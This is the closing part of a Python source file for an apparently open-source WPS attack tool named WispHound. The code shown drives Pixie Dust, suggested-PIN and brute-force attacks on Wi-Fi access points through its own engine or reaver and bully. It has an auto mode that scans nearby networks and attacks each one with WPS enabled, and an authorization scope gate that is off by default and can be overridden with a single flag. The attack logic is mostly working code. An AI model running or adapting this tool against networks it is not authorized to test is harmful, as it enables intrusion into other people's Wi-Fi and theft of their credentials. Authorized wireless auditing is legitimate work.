                    self.selected_wps = bool(t.get('WPS'))
                    return t['BSSID']
            except (ValueError, EOFError, KeyboardInterrupt):
                print(UI.msg('err', 'Invalid'), file=sys.stderr)


# ---------------------------------------------------------------------------
# Scope gate
# ---------------------------------------------------------------------------
def load_authorized(path):
    if not path: return None
    allowed = set()
    try:
        with open(path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'): continue
                allowed.add(line.replace('-', ':').upper())
    except OSError as e:
        print(UI.msg('err', f'Cannot read --authorized {path}: {e}'), file=sys.stderr)
        return set()
    return allowed


def check_authorized(bssid, allowed, i_understand):
    if allowed is None or i_understand: return True
    if bssid.upper() in allowed: return True
    print(UI.msg('err', f'{bssid} not in --authorized scope; add --i-understand to override'),
          file=sys.stderr)
    return False


# ---------------------------------------------------------------------------
# Auto pipeline
# ---------------------------------------------------------------------------
def auto_exploit(interface, args, db):
    scanner = WiFiScanner(interface, [], reverse_scan=False, db=db,
                          min_rssi=args.min_rssi, band=args.band)
    with UI.spinner('Scanning for networks'):
        networks = scanner.iw_scanner()
    if not networks:
        print(UI.msg('err', 'No networks'), file=sys.stderr); return
    order = sorted(networks.values(),
                   key=lambda n: (not n.get('WPS', False),
                                  not n.get('Pixie vulnerable', False),
                                  n.get('WPS locked', False),
                                  -n.get('Level', -100)))
    allowed = load_authorized(args.authorized)
    reports_dir = pick_reports_dir()
    skipped = collections.Counter()
    attempted = 0

    def _skip(net, reason):
        skipped[reason] += 1
        print(UI.msg('info', f"Skipping {net['BSSID']} ({reason})"), file=sys.stderr)

    if args.backend in (BACKEND_REAVER, BACKEND_BULLY):
        cls = ReaverAttacker if args.backend == BACKEND_REAVER else BullyAttacker
        if not cls.is_available():
            print(UI.msg('err', f'{args.backend} not installed'), file=sys.stderr); return
        try:
            mon = setup_monitor_mode(interface)
        except RuntimeError as e:
            print(UI.msg('err', str(e)), file=sys.stderr); return
        print(UI.msg('ok', f'Monitor: {UI.hi(mon)}'), file=sys.stderr)
        try:
            attacker = cls(mon, verbose=args.verbose, timeout=args.attack_timeout,
                           delay=args.delay, json_mode=args.json, dry_run=args.dry_run)
            for net in order:
                if not net.get('WPS'): _skip(net, 'no WPS'); continue
                if net['WPS locked']: _skip(net, 'WPS locked'); continue
                if db.is_locked(net['BSSID']): _skip(net, 'lockout backoff'); continue
                if args.pixie_only and not net['Pixie vulnerable']: _skip(net, 'not Pixie-vuln'); continue
                if not check_authorized(net['BSSID'], allowed, args.i_understand):
                    _skip(net, 'out of scope'); continue
                attempted += 1
                print(UI.section(f"Attacking {net['BSSID']} ({net.get('ESSID', 'HIDDEN')}) [{args.backend}]"),
                      file=sys.stderr)
                ch = net.get('Channel', 0)
                try:
                    if net['Pixie vulnerable']:
                        res = attacker.pixie_dust(net['BSSID'], channel=ch)
                        if not res.success and not args.dry_run:
                            pin = WPSpin().getLikely(net['BSSID'])
                            if pin:
                                res = attacker.single_pin(net['BSSID'], pin, channel=ch)
                    else:
                        res = attacker.bruteforce(net['BSSID'], channel=ch)
                    _handle_backend_result(res, net['BSSID'], db=db,
                                           save_result=args.write,
                                           reports_dir=reports_dir,
                                           json_mode=args.json)
                except KeyboardInterrupt:
                    print('\n' + UI.msg('warn', 'Interrupted.'), file=sys.stderr)
                    break
        finally:
            print(UI.msg('info', f'Restoring {interface}…'), file=sys.stderr)
            teardown_monitor_mode(mon, interface)
        print(UI.msg('info', f'attempted={attempted} skipped={dict(skipped)}'), file=sys.stderr)
        return

    for net in order:
        if not net.get('WPS'): _skip(net, 'no WPS'); continue
        if net['WPS locked']: _skip(net, 'WPS locked'); continue
        if db.is_locked(net['BSSID']): _skip(net, 'lockout backoff'); continue
        if args.pixie_only and not net['Pixie vulnerable']: _skip(net, 'not Pixie-vuln'); continue
        if not check_authorized(net['BSSID'], allowed, args.i_understand):
            _skip(net, 'out of scope'); continue
        attempted += 1
        print(UI.section(f"Attacking {net['BSSID']} ({net.get('ESSID', 'HIDDEN')})"), file=sys.stderr)
        try:
            comp = Companion(interface, save_result=args.write,
                             print_debug=args.verbose, db=db,
                             json_mode=args.json, trace_log=args.trace_log,
                             pixiewps_timeout=args.pixie_timeout,
                             cool_down=args.cool, auto_mode=True,
                             save_capture=args.save_capture, dry_run=args.dry_run,
                             lockout_budget=args.lockout_budget)
        except Exception as e:
            print(UI.msg('err', f'Cannot init Companion for {net["BSSID"]}: {e}'),
                  file=sys.stderr)
            continue
        comp.target_is_pixie_vuln = net['Pixie vulnerable']
        comp.target_chipset = net.get('Chipset', '')
        try:
            comp.single_connection(net['BSSID'], pixiemode=net['Pixie vulnerable'],
                                   showpixiecmd=args.show_pixie_cmd,
                                   pixieforce=args.pixie_force,
                                   store_pin_on_fail=net['Pixie vulnerable'])
        except KeyboardInterrupt:
            print('\n' + UI.msg('warn', 'Interrupted.'), file=sys.stderr); break
        except Exception as e:
            print(UI.msg('err', f'{net["BSSID"]} failed: {e}'), file=sys.stderr)
        finally:
            comp.cleanup()
    print(UI.msg('info', f'attempted={attempted} skipped={dict(skipped)}'), file=sys.stderr)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def ifaceUp(iface, down=False):
    try:
        rc, _ = run_proc(['ip', 'link', 'set', iface, 'down' if down else 'up'],
                         timeout=10, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
        return rc == 0
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False


def die(msg):
    sys.stderr.write(UI.msg('err', msg) + '\n')
    sys.exit(1)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def build_parser():
    p = argparse.ArgumentParser(
        description=f'WispHound {VERSION} — WPS recon & Pixie Dust auditor',
        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K')
    p.add_argument('-V', '--version', action='version', version=f'%(prog)s {VERSION}')
    p.add_argument('-i', '--interface', required=True)
    p.add_argument('-b', '--bssid')
    p.add_argument('-p', '--pin')
    p.add_argument('-c', '--channel', type=int, default=None)
    p.add_argument('-e', '--backend', choices=list(BACKENDS), default=BACKEND_INTERNAL)
    p.add_argument('-K', '--pixie-dust', action='store_true')
    p.add_argument('-F', '--pixie-force', action='store_true')
    p.add_argument('-X', '--show-pixie-cmd', action='store_true')
    p.add_argument('-B', '--bruteforce', action='store_true')
    p.add_argument('--pbc', '--push-button-connect', action='store_true')
    p.add_argument('-d', '--delay', type=float)
    p.add_argument('-w', '--write', action='store_true')
    p.add_argument('--iface-down', action='store_true')
    p.add_argument('--vuln-list', type=str,
                   default=os.path.join(os.path.dirname(os.path.realpath(__file__)), 'vulnwsc.txt'))
    p.add_argument('-l', '--loop', action='store_true')
    p.add_argument('-r', '--reverse-scan', action='store_true')
    p.add_argument('--mtk-wifi', action='store_true')
    p.add_argument('-v', '--verbose', action='store_true')
    p.add_argument('-A', '--auto', action='store_true')
    p.add_argument('--pixie-only', action='store_true')
    p.add_argument('-J', '--json', action='store_true')
    p.add_argument('--db', type=str, default=os.path.expanduser('~/.WispHound/targets.db'))
    p.add_argument('--trace-log', type=str, default=None)
    p.add_argument('--oui', type=str, default=None)
    p.add_argument('--timeout', type=int, default=None,
                   help='alias for --pixie-timeout (kept for compatibility)')
    p.add_argument('--pixie-timeout', type=int, default=120)
    p.add_argument('--attack-timeout', type=int, default=1200)
    p.add_argument('--cool', type=int, default=60)
    p.add_argument('--no-lockout-check', action='store_true')
    p.add_argument('--min-rssi', type=int, default=None)
    p.add_argument('--band', choices=['2.4', '5', '6'], default=None)
    p.add_argument('--resume', action='store_true')
    p.add_argument('--save-capture', action='store_true',
                   help='Persist M1-M7 transcript per BSSID to ~/.WispHound/captures/')
    p.add_argument('--offline', type=str, default=None,
                   help='Replay pixiewps from a saved capture JSON; no interface, no root')
    p.add_argument('--dry-run', action='store_true',
                   help='Print exact commands without executing')
    p.add_argument('--authorized', type=str, default=None,
                   help='File of BSSIDs you are authorised to test')
    p.add_argument('--i-understand', action='store_true',
                   help='Override --authorized scope gate')
    p.add_argument('--lockout-budget', type=int, default=0,
                   help='Refuse to attack a BSSID with N+ NACKs recently (default 0=off)')
    p.add_argument('--unsafe', action='store_true')
    p.add_argument('--tables-to-stdout', action='store_true',
                   help='Legacy --json behaviour: keep tables on stdout')
    return p


def main(argv=None):
    parser = build_parser()
    args = parser.parse_args(argv)
    if args.timeout is not None:
        args.pixie_timeout = args.timeout
    if args.no_lockout_check:
        args.cool = 0; args.lockout_budget = 0

    if sys.hexversion < 0x03060F0:
        die('Requires Python 3.6+')

    # JSON: tables -> stderr, JSON -> stdout, unless --tables-to-stdout.
    json_to_stderr = bool(args.json and not args.tables_to_stdout)
    print(UI.banner(), file=sys.stderr if json_to_stderr else sys.stdout)

    # Offline replay: no root, no interface.
    if args.offline:
        db = TargetDB(args.db) if (args.bssid or args.save_capture) else None
        ok = offline_replay(args.offline, full_range=args.pixie_force,
                            timeout=args.pixie_timeout, db=db, bssid=args.bssid)
        if db: db.close()
        return 0 if ok else 1

    if os.getuid() != 0:
        die('Run as root (or use --offline for capture replay)')

    if args.mtk_wifi:
        dev = Path('/dev/wmtWifi')
        if not dev.is_char_device():
            die('--mtk-wifi: /dev/wmtWifi missing or not a char device')
        try:
            dev.chmod(0o644); dev.write_text('1')
        except OSError as e:
            die(f'--mtk-wifi: {e}')

    if not ifaceUp(args.interface):
        # Helpful hint before dying.
        try:
            _, iw_out = run_proc(['iw', 'dev'], timeout=5,
                                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                 encoding='utf-8', errors='replace')
            print(UI.msg('info', 'Available interfaces (from iw dev):'), file=sys.stderr)
            for line in (iw_out or '').splitlines():
                if line.strip().startswith('Interface'):
                    print('   ' + line.strip(), file=sys.stderr)
        except Exception:
            pass
        die(f'Cannot bring up {args.interface} — check `iw dev`, '
            f'`ip link show {args.interface}`, or stop wlan0mon first')

    db = TargetDB(args.db)
    if args.oui:
        try: db.load_oui_file(args.oui)
        except FileNotFoundError:
            print(UI.msg('err', f'OUI file not found: {args.oui}'), file=sys.stderr)

    try:
        if args.auto:
            auto_exploit(args.interface, args, db)
            return 0

        while True:
            try:
                selected_vuln = False; selected_chipset = ''
                selected_channel = args.channel; selected_wps = True

                if args.pbc:
                    reports_dir = pick_reports_dir()
                    if args.backend == BACKEND_INTERNAL:
                        comp = Companion(args.interface, args.write,
                                         print_debug=args.verbose, db=db,
                                         json_mode=args.json, trace_log=args.trace_log,
                                         pixiewps_timeout=args.pixie_timeout,
                                         cool_down=args.cool, dry_run=args.dry_run,
                                         lockout_budget=args.lockout_budget)
                        try: comp.single_connection(bssid=args.bssid, pbc_mode=True)
                        finally: comp.cleanup()
                    elif args.backend == BACKEND_REAVER:
                        if not ReaverAttacker.is_available():
                            die('reaver not installed')
                        try: mon = setup_monitor_mode(args.interface)
                        except RuntimeError as e: die(str(e))
                        try:
                            atk = ReaverAttacker(mon, verbose=args.verbose,
                                                 timeout=args.attack_timeout,
                                                 delay=args.delay, dry_run=args.dry_run)
                            res = atk.pbc(args.bssid, channel=args.channel)
                            _handle_backend_result(res, args.bssid or 'PBC-AP', db=db,
                                                   save_result=args.write,
                                                   reports_dir=reports_dir,
                                                   json_mode=args.json)
                        finally:
                            teardown_monitor_mode(mon, args.interface)
                    else:
                        die('Bully has no PBC mode; use internal or reaver')
                else:
                    if not args.bssid:
                        vuln_list = []
                        try:
                            with open(args.vuln_list, 'r', encoding='utf-8') as f:
                                vuln_list = f.read().splitlines()
                        except FileNotFoundError: pass
                        scanner = WiFiScanner(args.interface, vuln_list,
                                              reverse_scan=args.reverse_scan, db=db,
                                              min_rssi=args.min_rssi, band=args.band)
                        args.bssid = scanner.prompt_network()
                        selected_vuln = scanner.selected_vuln
                        selected_chipset = scanner.selected_chipset
                        selected_wps = scanner.selected_wps
                        if not selected_channel:
                            selected_channel = scanner.selected_channel

                    if not args.bssid:
                        if not args.loop: break
                        continue
                    if not selected_wps:
                        print(UI.msg('warn', f"{args.bssid} has no WPS"), file=sys.stderr)
                        if not args.loop: break
                        args.bssid = None; continue

                    allowed = load_authorized(args.authorized)
                    if not check_authorized(args.bssid, allowed, args.i_understand):
                        if not args.loop: break
                        args.bssid = None; continue

                    reports_dir = pick_reports_dir()
                    if args.backend in (BACKEND_REAVER, BACKEND_BULLY):
                        cls = ReaverAttacker if args.backend == BACKEND_REAVER else BullyAttacker
                        if not cls.is_available(): die(f'{args.backend} not installed')
                        try: mon = setup_monitor_mode(args.interface)
                        except RuntimeError as e: die(str(e))
                        print(UI.msg('ok', f'Monitor: {UI.hi(mon)}'), file=sys.stderr)
                        try:
                            atk = cls(mon, verbose=args.verbose,
                                      timeout=args.attack_timeout,
                                      delay=args.delay, json_mode=args.json,
                                      dry_run=args.dry_run)
                            pixiemode = args.pixie_dust
                            pin = args.pin
                            if not pin and not args.bruteforce and not pixiemode and selected_vuln:
                                print(UI.msg('warn', f'Target looks Pixie Dust vulnerable ({selected_chipset or "?"})'),
                                      file=sys.stderr)
                                try:
                                    if input(UI.info('[?] Try Pixie Dust first? [Y/n] ')).strip().lower() != 'n':
                                        pixiemode = True
                                except (EOFError, KeyboardInterrupt): pixiemode = True
                            if not pin and not args.bruteforce and not pixiemode:
                                known = db.known_pin(args.bssid)
                                if known: pin = known
                                else:
                                    pins = WPSpin().getSuggestedUnique(args.bssid)
                                    if len(pins) == 1: pin = pins[0]['pin']
                                    elif len(pins) > 1:
                                        print(UI.section(f'Suggested PINs for {args.bssid}'), file=sys.stderr)
                                        print(UI.table(['#', 'PIN', 'Name'],
                                                       [[UI.muted(f'{i + 1})'), UI.ok(p['pin']), p['name']]
                                                        for i, p in enumerate(pins)],
                                                       aligns=['r', 'l', 'l']), file=sys.stderr)
                                        try:
                                            c = input(UI.info('Select PIN (Enter=Pixie/BF): ')).strip()
                                            if c.isdigit() and 1 <= int(c) <= len(pins):
                                                pin = pins[int(c) - 1]['pin']
                                        except (EOFError, KeyboardInterrupt): pass
                            res = None
                            if pixiemode or (not pin and not args.bruteforce):
                                res = atk.pixie_dust(args.bssid, channel=selected_channel)
                                if not res.success and not pin and not args.bruteforce:
                                    try:
                                        if input(UI.info('[?] Fall back to brute-force? [y/N] ')).strip().lower() == 'y':
                                            res = atk.bruteforce(args.bssid, channel=selected_channel,
                                                                 start_pin=args.pin)
                                    except (EOFError, KeyboardInterrupt): pass
                            elif pin:
                                res = atk.single_pin(args.bssid, pin, channel=selected_channel)
                            elif args.bruteforce:
                                res = atk.bruteforce(args.bssid, channel=selected_channel,
                                                     start_pin=args.pin)
                            if res is not None:
                                _handle_backend_result(res, args.bssid, db=db,
                                                       save_result=args.write,
                                                       reports_dir=reports_dir,
                                                       json_mode=args.json)
                        finally:
                            teardown_monitor_mode(mon, args.interface)
                    else:
                        comp = Companion(args.interface, args.write,
                                         print_debug=args.verbose, db=db,
                                         json_mode=args.json, trace_log=args.trace_log,
                                         pixiewps_timeout=args.pixie_timeout,
                                         cool_down=args.cool, save_capture=args.save_capture,
                                         dry_run=args.dry_run,
                                         lockout_budget=args.lockout_budget)
                        try:
                            comp.target_is_pixie_vuln = selected_vuln
                            comp.target_chipset = selected_chipset
                            if args.bruteforce:
                                comp.smart_bruteforce(args.bssid, args.pin, args.delay,
                                                      loop=args.loop, auto_resume=args.resume)
                            else:
                                comp.single_connection(args.bssid, args.pin, args.pixie_dust,
                                                       args.pbc, args.show_pixie_cmd,
                                                       args.pixie_force)
                        finally:
                            comp.cleanup()
                if not args.loop: break
                args.bssid = None
            except KeyboardInterrupt:
                if args.loop:
                    try:
                        if input(UI.info('\n[?] Exit? [N/y] ')).lower() == 'y':
                            break
                    except (EOFError, KeyboardInterrupt): break
                    args.bssid = None
                else:
                    print('\n' + UI.msg('warn', 'Aborting…'), file=sys.stderr); break
    finally:
        if args.iface_down: ifaceUp(args.interface, down=True)
        if args.mtk_wifi:
            try: Path('/dev/wmtWifi').write_text('0')
            except Exception: pass
        db.close()
    return 0


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print('\n' + UI.msg('warn', 'Interrupted.'), file=sys.stderr)
        sys.exit(130)
